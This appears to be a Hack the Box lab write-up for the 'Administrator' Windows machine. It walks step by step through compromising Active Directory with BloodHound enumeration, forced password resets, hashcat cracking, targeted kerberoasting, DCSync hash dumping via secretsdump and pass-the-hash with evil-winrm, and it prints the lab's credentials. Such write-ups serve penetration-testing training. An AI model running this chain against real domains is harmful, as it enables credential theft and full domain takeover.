# Administrator

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Medium**


## Table of Contents
- [Key Learnings](#key-learnings)


## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Abuse GenericAll and ForceChangePassword privileges to change user passwords using *net rpc*
- Exploit GenericWrite privileges by running a targeted kerberoasting attack on vulnerable account
- Abuse DCSync privs to dump SAM and LSA hashes and compromise the Domain Controller by passing the hash
- Use Hashcat to crack .psafe3 file


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan
2. Given olivia's credentials, run bloodhound to gather AD info

	```sudo bloodhound-python -d administrator.htb -u olivia -p ichliebedich -ns [IP] -c all```

4. load bloodhound info
5. bloodhound finds that olivia has GenericAll privs over michael

![image](https://github.com/user-attachments/assets/465491ec-fada-4fb5-93a8-c87657433cbe)

5. change michael's password
	
 	```net rpc password "michael" -U "administrator.htb"/"olivia" -S "[IP]"```

![image](https://github.com/user-attachments/assets/2b513753-0287-4187-87ad-8c5822921a5b)

6. michael has ForceChangePassword permission over benjamin

![image](https://github.com/user-attachments/assets/908af74c-ab83-4ecd-841c-7a0a2424dda1)

7. change benjamin's password 
	
 	```net rpc password "benjamin" -U "administrator.htb"/"michael" -S "[IP]"```

![image](https://github.com/user-attachments/assets/075d1086-566b-4d1a-aaa8-3410f46b5664)

8. benjamin can login to ftp, get Backup.psafe3 file

![image](https://github.com/user-attachments/assets/4788173f-4ac8-4391-ae25-0f660d10286f)

9. use hashcat to crack password on psafe3
	
 	```hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt```

10. reveals password for psafe3 file is `tekieromucho`
11. opening the psafe3 file reveals 3 credentials:
	1. alexander
	2. emily
	3. emma
12. bloodhound shows the emily has GenericWrite privs over ethan

![image](https://github.com/user-attachments/assets/efa95615-b1f6-49df-9c9f-52138705e2c6)

13. before doing kerberoast attack, need to fix clock skew
	1. On actual machine, not VM, go to cmd and cd into this folder `C:\Program Files\Oracle\VirtualBox`
	2. run this command `VBoxManage setextradata "VM name" "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" 1`
	3. then, on Kali VM, run `sudo rdate -n [IP]`
14. now can do a targeted kerberoast attack on ethan using emily's credentials
	
 	```targetedKerberoast.py --dc-ip [IP] -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb```

![image](https://github.com/user-attachments/assets/457a3b7e-2e71-48e6-8d52-8c4f11422798)

15. this reveals ethan's password is `limpbizkit`

![image](https://github.com/user-attachments/assets/fbdf1e5a-0096-4f89-a890-97fc07a89c1b)

16. ethan has DCSync permission over Administrator.htb. This means ethan is local admin so can do secretdump
	
 	```secretsdump.py administrator.htb/ethan:limpbizkit@[IP]```

![image](https://github.com/user-attachments/assets/fdfcde64-d5a7-40ad-9af6-b515e73e8769)

![image](https://github.com/user-attachments/assets/2967cec7-9da7-4d2f-8dec-c0916ff50ca5)

17. this gives us Administrator hash so can do PtH with evil-winrm 
	
 	```evil-winrm -i [IP] -u administrator -H [HASH]```

![image](https://github.com/user-attachments/assets/27ddb48f-62ec-49d8-9ba0-a104cd4df325)

18. gives us admin shell and rooted!
